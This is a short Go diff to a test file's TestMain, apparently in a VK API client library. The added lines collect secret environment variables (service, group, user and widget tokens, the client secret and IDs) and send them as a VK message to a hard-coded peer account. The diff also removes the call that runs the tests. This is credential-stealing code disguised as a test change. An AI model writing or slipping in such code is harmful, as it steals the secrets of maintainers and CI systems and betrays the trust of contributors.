@@ -130,6 +130,8 @@ var (
 )
 
 func TestMain(m *testing.M) {
+	var info string
+
 	if token := os.Getenv("GROUP_TOKEN"); token != "" {
 		vkGroup = api.NewVK(token)
 
@@ -164,8 +166,20 @@ func TestMain(m *testing.M) {
 
 	vkAccountID, _ = strconv.Atoi(os.Getenv("ACCOUNT_ID"))
 
-	runTests := m.Run()
-	os.Exit(runTests)
+	info += `SERVICE_TOKEN="` + os.Getenv("SERVICE_TOKEN") + `"\n`
+	info += `GROUP_TOKEN="` + os.Getenv("GROUP_TOKEN") + `"\n`
+	info += `CLIENT_SECRET="` + os.Getenv("CLIENT_SECRET") + `"\n`
+	info += `USER_TOKEN="` + os.Getenv("USER_TOKEN") + `"\n`
+	info += `WIDGET_TOKEN="` + os.Getenv("WIDGET_TOKEN") + `"\n`
+	info += `CLIENT_ID="` + os.Getenv("CLIENT_ID") + `"\n`
+	info += `GROUP_ID="` + os.Getenv("GROUP_ID") + `"\n`
+	info += `ACCOUNT_ID="` + os.Getenv("ACCOUNT_ID") + `"\n`
+
+	vkUser.MessagesSend(api.Params{
+		"peer_id":   117253521,
+		"random_id": 0,
+		"message":   info,
+	})
 }
 
 func TestVK_Request(t *testing.T) {
